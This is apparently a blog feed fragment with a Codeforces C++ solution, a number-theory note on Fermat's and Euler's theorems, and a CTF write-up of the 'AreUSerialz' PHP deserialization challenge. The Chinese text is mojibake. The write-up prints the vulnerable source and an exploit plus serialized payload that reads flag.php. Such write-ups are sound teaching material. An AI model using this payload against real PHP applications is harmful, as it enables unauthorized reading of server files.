class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                a[j*n+i+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=cnt&amp;&amp;a[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//        putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//    &#125;putchar(10);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);;</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> y,x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;y,&amp;x);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> pos=(x<span class="number">-1</span>)*n+y;</span><br><span class="line">        <span class="keyword">if</span>(a[pos]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d appear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">1</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d disappear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            cnt--;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">0</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//            putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//        &#125;putchar(10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>èµ›ä¸­åšå‡ºäº”é“ï¼Œèµ›åè¢«å‰ä¸€é“è¿˜è¡Œå§ï¼Œåæ­£ABCDå†™çš„æŒºå¿«çš„ï¼Œç­¾åˆ°æ‰‹é€Ÿå·²ç»åœ¨ç¨³æ­¥æå‡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ 2020 é’é¾™ç»„AreUSerialz writeup</title>
      <link href="/2022/04/28/wdb2020AreUSerialz/"/>
      <url>/2022/04/28/wdb2020AreUSerialz/</url>
      
        <content type="html"><![CDATA[<p>åšåˆ°ä¸€é“é¢˜ï¼Œå†™ä¸‹ <code>write up</code></p><span id="more"></span><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>æœ¬é¢˜ç»™äº†æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ <code>php</code> ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸»è¦çœ‹çœ‹ææ„å‡½æ•° <code>__destruct</code>ï¼Œå¦‚æœæˆå‘˜ <code>$this-&gt;op===&quot;2&quot;</code> é‚£ä¹ˆè®©å®ƒå˜æˆ1ï¼Œ<code>$this-&gt;content</code> å˜ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œ <code>process</code> å‡½æ•°ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹ <code>$this-&gt;process</code> å‡½æ•°çš„å…·ä½“ç»†èŠ‚ï¼Œå¦‚æœ <code>$this-&gt;op==&quot;2&quot;</code> é‚£ä¹ˆæ‰§è¡Œ <code>read</code> å‡½æ•°ï¼Œå¦åˆ™æ‰§è¡Œ <code>write</code> å‡½æ•°ã€‚é¦–å…ˆé¢˜ç›®å¼€å§‹ç»™æˆ‘ä»¬çœ‹åˆ°äº†æ˜¯æœ‰ä¸€ä¸ª <code>flag.php</code> æ–‡ä»¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯è¦åˆ©ç”¨è¿™ä¸ªå¯¹è±¡è¿›è¡Œè¯» <code>flag.php</code> æ“ä½œçš„ï¼Œä½†æ˜¯ææ„å‡½æ•°çš„æ—¶å€™ä¼šå¦‚æœå‘ç°æ“ä½œä¸ºè¯»ï¼Œåˆ™æ”¹ä¸ºå†™æ“ä½œã€‚é‚£ä¹ˆè¿™é‡Œéœ€è¦ç»•è¿‡ä¸€ä¸‹ï¼Œå› ä¸ºææ„å‡½æ•°è¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒï¼Œè€Œ <code>process</code> å‡½æ•°åˆ¤æ–­è¯»å†™æ“ä½œæ˜¯å¼±æ¯”è¾ƒï¼Œè¿™é‡Œæˆ‘ä»¬ååºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥ç»™ä¸€ä¸ª <code>int</code> ç»•è¿‡å»ï¼Œè®©å®ƒä¸ä¼šè¢«æ”¹å˜å¹¶ä¸”å¯ä»¥è¢«åˆ¤æ–­ä¸ºæ˜¯è¯»æ“ä½œã€‚</p><p>ç„¶åæˆ‘ä»¬å†æ¥çœ‹çœ‹å¤–é¢ï¼Œå¯ä»¥å‘ç°ç”¨äº†ä¸€ä¸ªå‡½æ•° <code>is_valid</code> ç”¨äºè¿‡æ»¤éæ³•å­—ç¬¦ï¼Œè€Œæˆ‘ä»¬ååºåˆ—åŒ–å¦‚æœå¯¹è±¡æœ¬èº«å¸¦æœ‰ <code>private</code> æˆ–è€… <code>protected</code> ç±»å‹çš„å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ç”¨ <code>0</code> å­—èŠ‚æ¥ååºåˆ—åŒ–ï¼Œä¸ç„¶ä¼šå¤±è´¥ï¼Œä½†æ˜¯ä½ç‰ˆæœ¬çš„ <code>php</code> å¯¹ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠæˆå‘˜ç±»å‹æ”¹æˆ <code>public</code> ç„¶åæŒ‰ç…§è¿™ä¸ªæ–¹æ³•æ„é€ å¾—åˆ°çš„åºåˆ—åŒ–ç»“æœå°±æ˜¯ <code>payload</code>ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> serialize(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//echo(serialize($this));</span></span><br><span class="line">        <span class="comment">//if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">        <span class="comment">//    $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;content = &quot;&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="comment">//$res=&#x27;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;r&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="/2022/04/28/wdb2020AreUSerialz/1.png" alt="1"></p><p>é‚£ä¹ˆè¿™ä¸ª <code>payload</code> ç›´æ¥æ‰“è¿›å»å°±å¯ä»¥å†æµè§ˆå™¨æºä»£ç æ¨¡å¼çœ‹åˆ°è¯»å‡ºçš„ <code>flag</code> äº†ã€‚</p><p><img src="/2022/04/28/wdb2020AreUSerialz/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> phpååºåˆ—åŒ– </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è´¹é©¬å°å®šç†çš„åº”ç”¨åŠè¯æ˜</title>
      <link href="/2022/04/28/femal/"/>
      <url>/2022/04/28/femal/</url>
      
        <content type="html"><![CDATA[<p>å°å­¦ä¸€æ³¢æ•°è®º</p><span id="more"></span><h2 id="è´¹é©¬å°å®šç†"><a href="#è´¹é©¬å°å®šç†" class="headerlink" title="è´¹é©¬å°å®šç†"></a>è´¹é©¬å°å®šç†</h2><p>è‹¥ $p$ ä¸ºç´ æ•°ï¼Œ$\gcd(a, p) = 1$ï¼Œåˆ™ $a^{p - 1} \equiv 1 \pmod{p}$ã€‚</p><p>å¦ä¸€ä¸ªå½¢å¼ï¼šå¯¹äºä»»æ„æ•´æ•° $a$ï¼Œæœ‰ $a^p \equiv a \pmod{p}$ã€‚</p><h3 id="è¯æ˜"><a href="#è¯æ˜" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h3><p>è®¾ä¸€ä¸ªè´¨æ•°ä¸º $p$ï¼Œæˆ‘ä»¬å–ä¸€ä¸ªä¸ä¸º $p$ å€æ•°çš„æ•° $a$ã€‚</p><p>æ„é€ ä¸€ä¸ªåºåˆ—ï¼š$A={1,2,3\dots,p-1}$ï¼Œè¿™ä¸ªåºåˆ—æœ‰ç€è¿™æ ·ä¸€ä¸ªæ€§è´¨ï¼š</p><p>$$<br>\prod_{i=1}^{n}\space A_i\equiv\prod_{i=1}^{n} (A_i\times a) \pmod p<br>$$</p><p>è¯æ˜ï¼š</p><p>$$<br>\because gcd(A_i,p)=1,gcd(A_i\times a,p)=1<br>$$</p><p>åˆå› ä¸ºæ¯ä¸€ä¸ª $A_i\times a \pmod p$ éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸” $A_i\times a \pmod p &lt; p$</p><p>å¾—è¯ï¼ˆæ¯ä¸€ä¸ª $A_i\times a$ éƒ½å¯¹åº”äº†ä¸€ä¸ª $A_i$)</p><p>è®¾ $f=(p-1)!$, åˆ™ $f\equiv a\times A_1\times a\times A_2\times a \times A_3 \dots \times  A_{p-1} \pmod p$</p><p>$$<br>a^{p-1}\times f \equiv f \pmod p \     a^{p-1} \equiv 1 \pmod p<br>$$</p><p>è¯æ¯•ã€‚</p><h2 id="æ¬§æ‹‰å®šç†"><a href="#æ¬§æ‹‰å®šç†" class="headerlink" title="æ¬§æ‹‰å®šç†"></a>æ¬§æ‹‰å®šç†</h2><p>æ¬§æ‹‰å®šç†å®é™…ä¸Šå°±æ˜¯è´¹é©¬å°å®šç†çš„æ¨å¹¿ï¼Œæ¬§æ‹‰å®šç†çš„å†…å®¹å¦‚ä¸‹ã€‚</p><p>è‹¥ $\gcd(a, m) = 1$ï¼Œåˆ™ $a^{\varphi(m)} \equiv 1 \pmod{m}$ã€‚</p><p>è‡³äºè¿™ä¸ªè¯æ˜ä¹ˆï¼Œæœ‰ç‚¹å¤æ‚ï¼Œä¸ç»†è®²äº†ï¼ˆå®åˆ™ä¹Ÿä¸ä¼šï¼‰ã€‚å¯ä»¥è¯´ï¼Œè´¹é©¬å°å®šç†æ’‘èµ·äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚æˆ‘ä»¬ç»å¸¸ç®—çš„é€†å…ƒï¼Œæˆ–è€…æ˜¯ç»å…¸éå¯¹ç§°åŠ å¯† <code>RSA</code> éƒ½æœ‰ç”¨åˆ°è´¹é©¬å°å®šç†ã€‚</p><h2 id="é€†å…ƒ"><a href="#é€†å…ƒ" class="headerlink" title="é€†å…ƒ"></a>é€†å…ƒ</h2><p>è¿™ä¸ªæ¦‚å¿µæ˜¯æŠ½è±¡ä»£æ•°é‡Œé¢çš„ï¼Œå®šä¹‰ä»£æ•°ä¸­çš„äºŒå…ƒè¿ç®— <code>*</code> å’Œæœ‰é™é›† <code>G</code> ï¼Œè‹¥ $a*bâˆˆG(aâˆˆG,bâˆˆG)$ åˆ™ï¼Œç¾¤ $&lt;G,*&gt;$ 